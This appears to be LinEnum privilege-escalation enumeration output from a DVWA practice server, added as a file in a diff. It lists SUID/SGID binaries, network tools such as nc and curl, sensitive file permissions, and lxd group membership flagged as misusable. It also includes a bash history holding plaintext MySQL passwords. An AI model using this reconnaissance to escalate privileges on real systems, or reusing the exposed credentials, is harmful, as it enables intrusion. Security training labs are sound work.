+/var/www/html/vulnerabilities/weak_id/help:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 2.1K Nov  9 03:25 help.php
+
+/var/www/html/vulnerabilities/weak_id/source:
+total 24K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  395 Nov  9 03:25 high.php
+-rw-rw-r-- 1 www-data www-data  255 Nov  9 03:25 impossible.php
+-rw-rw-r-- 1 www-data www-data  289 Nov  9 03:25 low.php
+-rw-rw-r-- 1 www-data www-data  145 Nov  9 03:25 medium.php
+
+/var/www/html/vulnerabilities/xss_d:
+total 20K
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 16 www-data www-data 4.0K Nov 17 07:39 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 help
+-rw-rw-r--  1 www-data www-data 2.4K Nov  9 03:25 index.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 source
+
+/var/www/html/vulnerabilities/xss_d/help:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 3.4K Nov  9 03:25 help.php
+
+/var/www/html/vulnerabilities/xss_d/source:
+total 24K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  356 Nov  9 03:25 high.php
+-rw-rw-r-- 1 www-data www-data   82 Nov  9 03:25 impossible.php
+-rw-rw-r-- 1 www-data www-data   48 Nov  9 03:25 low.php
+-rw-rw-r-- 1 www-data www-data  289 Nov  9 03:25 medium.php
+
+/var/www/html/vulnerabilities/xss_r:
+total 20K
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 16 www-data www-data 4.0K Nov 17 07:39 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 help
+-rw-rw-r--  1 www-data www-data 1.9K Nov  9 03:25 index.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 source
+
+/var/www/html/vulnerabilities/xss_r/help:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 2.7K Nov  9 03:25 help.php
+
+/var/www/html/vulnerabilities/xss_r/source:
+total 24K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  315 Nov  9 03:25 high.php
+-rw-rw-r-- 1 www-data www-data  413 Nov  9 03:25 impossible.php
+-rw-rw-r-- 1 www-data www-data  229 Nov  9 03:25 low.php
+-rw-rw-r-- 1 www-data www-data  288 Nov  9 03:25 medium.php
+
+/var/www/html/vulnerabilities/xss_s:
+total 20K
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 16 www-data www-data 4.0K Nov 17 07:39 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 help
+-rw-rw-r--  1 www-data www-data 2.9K Nov  9 03:25 index.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 source
+
+/var/www/html/vulnerabilities/xss_s/help:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 2.6K Nov  9 03:25 help.php
+
+/var/www/html/vulnerabilities/xss_s/source:
+total 24K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 1.4K Nov  9 03:25 high.php
+-rw-rw-r-- 1 www-data www-data 1.4K Nov  9 03:25 impossible.php
+-rw-rw-r-- 1 www-data www-data 1.2K Nov  9 03:25 low.php
+-rw-rw-r-- 1 www-data www-data 1.3K Nov  9 03:25 medium.php
+
+
+[00;33m### INTERESTING FILES ####################################[00m
+[00;31m[-] Useful file locations:[00m
+/usr/bin/nc
+/usr/bin/netcat
+/usr/bin/wget
+/usr/bin/curl
+
+
+[00;31m[-] Can we read/write sensitive files:[00m
+-rw-r--r-- 1 root root 1873 Nov  9 03:56 /etc/passwd
+-rw-r--r-- 1 root root 799 Nov  9 03:56 /etc/group
+-rw-r--r-- 1 root root 581 Sep 16  2020 /etc/profile
+-rw-r----- 1 root shadow 1078 Nov  9 03:56 /etc/shadow
+
+
+[00;31m[-] SUID files:[00m
+-rwsr-xr-x 1 root root 22840 May 26 11:46 /usr/libexec/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 44784 Jan  7  2021 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 72304 Jan  7  2021 /usr/bin/passwd
+-rwsr-xr-x 1 root root 39296 Feb 26  2021 /usr/bin/umount
+-rwsr-xr-x 1 root root 72072 Feb 26  2021 /usr/bin/su
+-rwsr-xr-x 1 root root 88496 Jan  7  2021 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 31032 May 26 11:46 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 53040 Jan  7  2021 /usr/bin/chsh
+-rwsr-xr-x 1 root root 55680 Feb 26  2021 /usr/bin/mount
+-rwsr-xr-x 1 root root 39144 Mar 23  2021 /usr/bin/fusermount
+-rwsr-xr-x 1 root root 190952 Feb 18  2021 /usr/bin/sudo
+-rwsr-xr-x 1 root root 85064 Jan  7  2021 /usr/bin/chfn
+-rwsr-xr-x 1 root root 301512 Jul 28 13:33 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 126024 Mar 30  2021 /usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root messagebus 51496 Feb 26  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 85064 Jul 14 22:08 /snap/core20/1169/usr/bin/chfn
+-rwsr-xr-x 1 root root 53040 Jul 14 22:08 /snap/core20/1169/usr/bin/chsh
+-rwsr-xr-x 1 root root 88464 Jul 14 22:08 /snap/core20/1169/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 55528 Jul 21  2020 /snap/core20/1169/usr/bin/mount
+-rwsr-xr-x 1 root root 44784 Jul 14 22:08 /snap/core20/1169/usr/bin/newgrp
+-rwsr-xr-x 1 root root 68208 Jul 14 22:08 /snap/core20/1169/usr/bin/passwd
+-rwsr-xr-x 1 root root 67816 Jul 21  2020 /snap/core20/1169/usr/bin/su
+-rwsr-xr-x 1 root root 166056 Jan 19  2021 /snap/core20/1169/usr/bin/sudo
+-rwsr-xr-x 1 root root 39144 Jul 21  2020 /snap/core20/1169/usr/bin/umount
+-rwsr-xr-- 1 root systemd-resolve 51344 Jun 11  2020 /snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 473576 Jul 23 12:55 /snap/core20/1169/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 115208 Oct  5 13:58 /snap/snapd/13640/usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root root 123432 Oct 21 21:52 /snap/snapd/13831/usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root root 43088 Sep 16  2020 /snap/core18/2246/bin/mount
+-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/2246/bin/ping
+-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/2246/bin/su
+-rwsr-xr-x 1 root root 26696 Sep 16  2020 /snap/core18/2246/bin/umount
+-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/2246/usr/bin/chfn
+-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/2246/usr/bin/chsh
+-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/2246/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/2246/usr/bin/newgrp
+-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/2246/usr/bin/passwd
+-rwsr-xr-x 1 root root 149080 Jan 19  2021 /snap/core18/2246/usr/bin/sudo
+-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/2246/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 436552 Aug 11 18:02 /snap/core18/2246/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 43088 Sep 16  2020 /snap/core18/1997/bin/mount
+-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/1997/bin/ping
+-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/1997/bin/su
+-rwsr-xr-x 1 root root 26696 Sep 16  2020 /snap/core18/1997/bin/umount
+-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/1997/usr/bin/chfn
+-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/1997/usr/bin/chsh
+-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/1997/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/1997/usr/bin/newgrp
+-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/1997/usr/bin/passwd
+-rwsr-xr-x 1 root root 149080 Jan 19  2021 /snap/core18/1997/usr/bin/sudo
+-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/1997/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/1997/usr/lib/openssh/ssh-keysign
+
+
+[00;31m[-] SGID files:[00m
+-rwxr-sr-x 1 root tty 22920 Feb 26  2021 /usr/bin/write.ul
+-rwxr-sr-x 1 root ssh 260376 Jul 28 13:33 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root shadow 31312 Jan  7  2021 /usr/bin/expiry
+-rwxr-sr-x 1 root tty 35200 Feb 26  2021 /usr/bin/wall
+-rwxr-sr-x 1 root crontab 43720 Mar 15  2021 /usr/bin/crontab
+-rwxr-sr-x 1 root shadow 84512 Jan  7  2021 /usr/bin/chage
+-rwxr-sr-x 1 root shadow 43168 Aug  6  2020 /usr/sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root shadow 43160 Aug  6  2020 /usr/sbin/unix_chkpwd
+-rwxr-sr-x 1 root utmp 14488 Dec  5  2020 /usr/lib/x86_64-linux-gnu/utempter/utempter
+-rwxr-sr-x 1 root shadow 84512 Jul 14 22:08 /snap/core20/1169/usr/bin/chage
+-rwxr-sr-x 1 root shadow 31312 Jul 14 22:08 /snap/core20/1169/usr/bin/expiry
+-rwxr-sr-x 1 root crontab 350504 Jul 23 12:55 /snap/core20/1169/usr/bin/ssh-agent
+-rwxr-sr-x 1 root tty 35048 Jul 21  2020 /snap/core20/1169/usr/bin/wall
+-rwxr-sr-x 1 root shadow 43168 Apr  8  2021 /snap/core20/1169/usr/sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root shadow 43160 Apr  8  2021 /snap/core20/1169/usr/sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 34816 Apr  8  2021 /snap/core18/2246/sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root shadow 34816 Apr  8  2021 /snap/core18/2246/sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 71816 Mar 22  2019 /snap/core18/2246/usr/bin/chage
+-rwxr-sr-x 1 root shadow 22808 Mar 22  2019 /snap/core18/2246/usr/bin/expiry
+-rwxr-sr-x 1 root crontab 362640 Aug 11 18:02 /snap/core18/2246/usr/bin/ssh-agent
+-rwxr-sr-x 1 root tty 30800 Sep 16  2020 /snap/core18/2246/usr/bin/wall
+-rwxr-sr-x 1 root shadow 34816 Jul 21  2020 /snap/core18/1997/sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root shadow 34816 Jul 21  2020 /snap/core18/1997/sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 71816 Mar 22  2019 /snap/core18/1997/usr/bin/chage
+-rwxr-sr-x 1 root shadow 22808 Mar 22  2019 /snap/core18/1997/usr/bin/expiry
+-rwxr-sr-x 1 root crontab 362640 Mar  4  2019 /snap/core18/1997/usr/bin/ssh-agent
+-rwxr-sr-x 1 root tty 30800 Sep 16  2020 /snap/core18/1997/usr/bin/wall
+
+
+[00;33m[+] Possibly interesting SGID files:[00m
+-rwxr-sr-x 1 root tty 22920 Feb 26  2021 /usr/bin/write.ul
+
+
+[00;31m[+] Files with POSIX capabilities set:[00m
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+/usr/bin/traceroute6.iputils cap_net_raw=ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+/snap/core20/1169/usr/bin/ping cap_net_raw=ep
+
+
+[00;33m[+] Private SSH keys found!:[00m
+/home/dvwa/LinEnum.sh
+
+
+[00;33m[+] AWS secret keys found!:[00m
+/home/dvwa/LinEnum.sh
+
+
+[00;31m[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems[00m
+# /etc/fstab: static file system information.
+#
+# Use 'blkid' to print the universally unique identifier for a
+# device; this may be used with UUID= as a more robust way to name devices
+# that works even if disks are added and removed. See fstab(5).
+#
+# <file system> <mount point>   <type>  <options>       <dump>  <pass>
+# / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation
+/dev/disk/by-id/dm-uuid-LVM-qQoeadFDvtlcwjn24M0YdmFYMMY76csZzEhjrlota2XRnxk9Prk4e36MsSglFoiT / ext4 defaults 0 1
+# /boot was on /dev/sda2 during curtin installation
+/dev/disk/by-uuid/1a98a813-f8ca-4abe-9038-1e9d778b729d /boot ext4 defaults 0 1
+/swap.img	none	swap	sw	0	0
+
+
+[-] Can't search *.conf files as no keyword was entered
+
+[-] Can't search *.php files as no keyword was entered
+
+[-] Can't search *.log files as no keyword was entered
+
+[-] Can't search *.ini files as no keyword was entered
+
+[00;31m[-] All *.conf files in /etc (recursive 1 level):[00m
+-rw-r--r-- 1 root root 191 Jan 24  2021 /etc/libaudit.conf
+-rw-r--r-- 1 root root 92 Aug 14  2019 /etc/host.conf
+-rw-r--r-- 1 root root 3028 Apr 21  2021 /etc/adduser.conf
+-rw-r--r-- 1 root root 552 Aug 23  2018 /etc/pam.conf
+-rw-r--r-- 1 root root 4436 Dec 15  2020 /etc/hdparm.conf
+-rw-r--r-- 1 root root 1382 Feb 24  2021 /etc/rsyslog.conf
+-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
+-rw-r--r-- 1 root root 1260 Jun 16  2020 /etc/ucf.conf
+-rw-r--r-- 1 root root 510 Apr 21  2021 /etc/nsswitch.conf
+-rw-r--r-- 1 root root 774 Feb 22  2021 /etc/mke2fs.conf
+-rw-r--r-- 1 root root 3975 Feb 18  2021 /etc/sudo.conf
+-rw-r--r-- 1 root root 14867 Jun 29  2020 /etc/ltrace.conf
+-rw-r--r-- 1 root root 41 Mar  4  2021 /etc/multipath.conf
+-rw-r--r-- 1 root root 34 Mar 31  2021 /etc/ld.so.conf
+-rw-r--r-- 1 root root 685 Feb 22  2021 /etc/e2scrub.conf
+-rw-r--r-- 1 root root 5663 Nov  9 03:15 /etc/ca-certificates.conf
+-rw-r--r-- 1 root root 604 Sep 15  2018 /etc/deluser.conf
+-rw-r--r-- 1 root root 2584 Feb  1  2021 /etc/gai.conf
+-rw-r--r-- 1 root root 2969 Apr 18  2020 /etc/debconf.conf
+-rw-r--r-- 1 root root 533 Feb  9  2021 /etc/logrotate.conf
+-rw-r--r-- 1 root root 2355 May 17  2020 /etc/sysctl.conf
+-rw-r--r-- 1 root root 6920 Aug 17  2020 /etc/overlayroot.conf
+-rw-r--r-- 1 root root 6169 Feb 18  2021 /etc/sudo_logsrvd.conf
+-rw-r--r-- 1 root root 642 Feb 22  2021 /etc/xattr.conf
+
+
+[00;31m[-] Current user's history files:[00m
+-rw------- 1 dvwa dvwa 6762 Nov 17 08:48 /home/dvwa/.bash_history
+
+
+[00;31m[-] Location and contents (if accessible) of .bash_history file(s):[00m
+/home/dvwa/.bash_history
+apt-get -y install apache2 mariadb-server php php-mysqli php-gd libapache2-mod-php
+sudo apt-get -y install apache2 mariadb-server php php-mysqli php-gd libapache2-mod-php
+rm -r /var/www/html/index.html
+git clone https://github.com/ethicalhack3r/DVWA /tmp/DVWA
+rm -r /tmp/DVWA
+git clone https://github.com/digininja/DVWA.git /tmp/DVWA
+rsync -avP /tmp/DVWA/ /var/www/html/
+sudo rsync -avP /tmp/DVWA/ /var/www/html/
+ls /var/www/html/
+cp /var/www/html/config/config.inc.php.dist /var/www/html/config/config.inc.php
+vim /var/www/html/config/config.inc.php
+nano /var/www/html/config/config.inc.php
+systemctl restart mysql
+php -v
+nano /etc/php/7.2/apache2/php.ini
+nano /etc/php/7.4/apache2/php.ini
+sudo nano /etc/php/7.4/apache2/php.ini
+chown -R www-data.www-data /var/www/html/
+sudo chown -R www-data.www-data /var/www/html/
+ip a
+# tail /var/log/apache2/error.log
+systemctl restart http2
+cp
+ps
+apt install apache2 -y
+sudo apt install apache2 -y
+systemctl enable apache2
+ufw app list
+sudo ufw app list
+apt install mariadb-server -y
+sudo apt install mariadb-server -y
+sudo apt install mysql-server -y
+sudo apt install php libapache2-mod-php php-mysql -y
+vim /var/www/html/test.php
+sudo nano /var/www/html/test.php
+systemctl restart apache2
+rm -rf /var/www/html/test.php
+sudo rm -rf /var/www/html/test.php
+rm -r /var/www/html/index.html
+sudo rsync -avP /tmp/DVWA/ /var/www/html/
+ls /var/www/html/
+sudo cp /var/www/html/config/config.inc.php.dist /var/www/html/config/config.inc.php
+sudo nano /var/www/html/config/config.inc.php
+mysql
+mariadb
+ps
+mysql
+service start mysql
+service mysql start
+systemctl status mysql.service
+service mysql stop
+service mysql start
+systemctl status mysql.service
+service mysql stop
+apt install php-mysqli -y
+sudo apt install php-mysqli -y
+mysql -u root -pNewP@SSw0rd -D dvwa -h 127.0.0.1
+service mysql start
+n
+dmesg | grep mysql
+sudo dmesg | grep mysql
+mysqladmin status
+df -h
+mysql
+service mysql start
+journalctl -xe
+sudo apt-get remove mysql
+sudo apt-get install mysql
+sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf
+sudo apt purge mysql
+sudo apt-get remove --purge mysql*
+sudo apt-get remove --purge mariadb*
+rm -rf /etc/mysql
+sudo rm -rf /etc/mysql
+sudo apt install mysql
+sudo apt install mysql-server -y
+mysql_secure_installation
+sudo mysql_secure_installation
+apt install php libapache2-mod-php php-mysql -y
+sudo apt install php libapache2-mod-php php-mysql -y
+cp /var/www/html/config/config.inc.php.dist /var/www/html/config/config.inc.php
+sudo cp /var/www/html/config/config.inc.php.dist /var/www/html/config/config.inc.php
+sudo nano /var/www/html/config/config.inc.php
+mysql
+sudo mysql
+sudo nano /var/www/html/config/config.inc.php
+sudo systemctl restart mysql
+systemctl restart apache2
+php -v
+sudo chown -R www-data.www-data /var/www/html/
+tail /var/log/apache2/error.log
+sudo rm -r /var/www/html/index.html
+mysql -u root -pSTRONGP@SSw0rd -D dvwa -h 127.0.0.1
+mysql -u dvwa -pSTRONGP@SSw0rd -D dvwa -h 127.0.0.1
+sudo mysql -u dvwa -pSTRONGP@SSw0rd -D dvwa -h 127.0.0.1
+mysql -u root -p
+mysql -u dvwa -p
+mysql
+sudo mysql
+systemctl restart mysql
+mysql -u root -pP@SSw0rd -D dvwa -h 127.0.0.1
+sudo mysql -u root -pP@SSw0rd -D dvwa -h 127.0.0.1
+sudo mysql -u dvwa -pP@SSw0rd -D dvwa -h 127.0.0.1
+mysql -u root -p
+mysql -u dvwa -p
+sudo nano /var/www/html/config/config.inc.php
+service mysql restart
+mysql -u root -pp@SSw0rd -D dvwa -h 127.0.0.1
+mysql -u dvwa -pp@ssw0rd -D dvwa -h 127.0.0.1
+sudo nano /var/www/html/config/config.inc.php
+mysql -u root -pp@ssw0rd -D dvwa -h 127.0.0.1
+sudo nano /var/www/html/config/config.inc.php
+service mysql restart
+sudo mysql -u dvwa
+sudo mysql -u dvwa -p p@ssw0rd
+sudo mysql
+mysql
+service mysql status
+su -
+sudo mysql
+sudo nano /var/www/html/config/config.inc.php
+service mysql restart
+sudo mysql
+sudo mysql -u dvwa -pdvwa
+mysql -u dvwa -pdvwa
+sudo mysql -u root -p
+mysql -u dvwa -pdvwa
+sudo nano /var/www/html/config/config.inc.php
+sudo mysql -u root
+mysql -u root -p
+sudo apt purge mysql
+sudo apt purge mysql*
+sudo apt install mysql-server -y
+mysql_secure_installation
+sudo mysql_secure_installation
+service mysql status
+sudo mysql_secure_installation
+sudo mysql
+sudo nano /etc/my.cnf
+sudo nano /etc/mysql/my.cnf
+service mysql restart
+mysql -u root -p
+echo "CREATE USER 'root'@'localhost' IDENTIFIED BY 'root';" > your_init_file.sql
+echo "GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' WITH GRANT OPTION;" >> your_init_file.sql 
+echo "FLUSH PRIVILEGES;" >> your_init_file.sql
+killall mysqld
+sudo killall mysql*
+sudo killall mysql
+sudo service mysql stop
+mysql_safe --init-file=$PWD/your_init_file.sql
+mysql 
+mysqld_safe --init-file=$PWD/your_init_file.sql
+sudo mysqld_safe --init-file=$PWD/your_init_file.sql
+mysqld_safe --init-file=$PWD/your_init_file.sql
+sudo mysqld_safe --init-file=$PWD/your_init_file.sql
+ls -l /var/lib/mysql
+sudo ls -l /var/lib/mysql
+sudo nano /var/www/html/config/config.inc.php
+sudo service mysql start
+sudo mysql
+apt install php-mysqli -y
+sudo apt install php-mysqli -y
+systemctl restart apache2
+mysql -u root -pdvwa -D dvwa -h 127.0.0.1
+mysql -u root -p
+mysql -u root
+mysql -u root@127.0.0.1
+mysql -u root
+mysql -u root -D dvwa -h 127.0.0.1
+sudo mysql -u root -D dvwa -h 127.0.0.1
+sudo mysql -u root
+sudo mysql ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'test';
+sudo nano /htdocs/dvwa/config/config.inc.php
+sudo nano /var/www/html/config/config.inc.php
+sudo service mysql restart
+sudo service mysql stop
+sudo apt-get purge mysql-server mysql-common mysql-client mysql*
+sudo rm -rvfi /var/lib/mysql /etc/mysql/ /var/log/mysql*
+sudo rm -rvfi /var/lib/mysql /etc/mysql/ /var/log/mysql* -y
+sudo rm -rvfi /var/lib/mysql /etc/mysql/ /var/log/mysql*
+sudo rm -rf /var/lib/mysql /etc/mysql/ /var/log/mysql*
+apt install mysql-server -y
+sudo apt install mysql-server -y
+mysql_secure_installation
+su -
+usermod -aG sudo dvwa
+sudo usermod -aG sudo dvwa
+sudo visudo
+mysql_secure_installation
+sdo mysql_secure_installation
+sudo mysql_secure_installation
+mysql
+sudo mysql
+sudo nano /var/www/html/config/config.inc.php
+mysql -u root -pdvwa -D dvwa -h 127.0.0.1
+mysql -u root -p dvwa -D dvwa -h 127.0.0.1
+mysql -u root -p
+sudo mysqlsudo apt-get remove --purge mysql*
+systemctl restart mysql
+sudo nano /var/www/html/config/config.inc.php
+sudo mysql
+sudo apt-get remove --purge mysql*
+sudo apt-get remove dbconfig-mysql
+sudo apt-get autoclean
+sudo apt-get purge mysql*
+sudo apt-get install mysql-server
+sudo rm -rf /etc/mysql /var/lib/mysql
+sudo apt autoremove
+sudo apt autoclean
+apt install mariadb-server -y
+sudo apt install mariadb-server -y
+mysql_secure_installation
+sudo mysql_secure_installation
+mariadb
+sudo nano /var/www/html/config/config.inc.php
+mysql
+sudo mysql
+sudo nano /var/www/html/config/config.inc.php
+systemctl restart mysql
+whoami
+getuid
+logout
+
+
+[00;31m[-] Location and Permissions (if accessible) of .bak file(s):[00m
+-rw-r--r-- 1 www-data www-data 2394 Nov  9 04:55 /var/www/html/config/config.inc.php.bak
+
+
+[00;31m[-] Any interesting mail in /var/mail:[00m
+total 8
+drwxrwsr-x  2 root mail 4096 Apr 21  2021 .
+drwxr-xr-x 14 root root 4096 Nov  9 03:21 ..
+
+
+[00;33m[+] We're a member of the (lxd) group - could possibly misuse these rights![00m
+uid=1000(dvwa) gid=1000(dvwa) groups=1000(dvwa),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
+
+
+[00;33m### SCAN COMPLETE ####################################[00m
